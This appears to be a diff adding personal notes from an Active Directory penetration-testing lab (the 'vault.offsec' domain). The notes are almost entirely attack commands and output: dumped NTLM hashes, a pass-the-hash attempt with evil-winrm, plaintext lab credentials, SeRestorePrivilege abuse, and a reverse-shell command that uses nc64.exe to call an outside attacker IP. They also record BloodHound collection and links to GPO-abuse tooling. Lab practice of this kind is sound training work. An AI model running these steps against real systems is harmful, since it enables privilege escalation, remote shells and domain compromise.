@@ -223,3 +223,91 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887d
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
+
+pass the hash to winrm
+
+└─$ evil-winrm -i 192.168.204.172 -u administrator -H '608339ddc8f434ac21945e026887dc36'
+                                                                     
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\> whoami
+                                    
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1
+
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Management Users'
+Alias name     Remote Management Users
+Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+
+Members
+
+-------------------------------------------------------------------------------
+anirudh
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Desktop Users'
+Alias name     Remote Desktop Users
+Comment        Members in this group are granted the right to logon remotely
+
+Members
+
+-------------------------------------------------------------------------------
+The command completed successfully.
+
+└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Management Users" --attr msds-memberTransitive
+
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=vault,DC=offsec
+msds-memberTransitive: CN=Anirudh,CN=Users,DC=vault,DC=offsec
+                                                                                                    
+┌──(ed㉿kali)-[~]
+└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Desktop Users" --attr msds-memberTransitive
+
+distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=vault,DC=offsec
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload Invoke-SeRestoreAbuse.ps1
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload nc64.exe
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> . .\Invoke-SeRestoreAbuse.ps1
+
+C:\Users\anirudh\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"'
+[+] SeRestorePrivilege privilege enabled
+[+] ImagePath set to: cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"
+
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpHound.exe
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> .\SharpHound.exe
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> download 20260818083518_BloodHound.zip
+
+
+└─$ bloodhound-python -u anirudh -p 'SecureHM' -ns 192.168.204.172 -d vault.offsec -c All --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: vault.offsec
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
+INFO: Connecting to LDAP server: dc.vault.offsec
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.vault.offsec
+INFO: Found 5 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.vault.offsec
+INFO: Done in 00M 20S
+INFO: Compressing output into 20260818114230_bloodhound.zip
+
+
+ANIRUDH@VAULT.OFFSEC ----General Write ----> DEfault domian policy
+
+https://www.thehacker.recipes/ad/movement/group-policies
+
+https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master
+
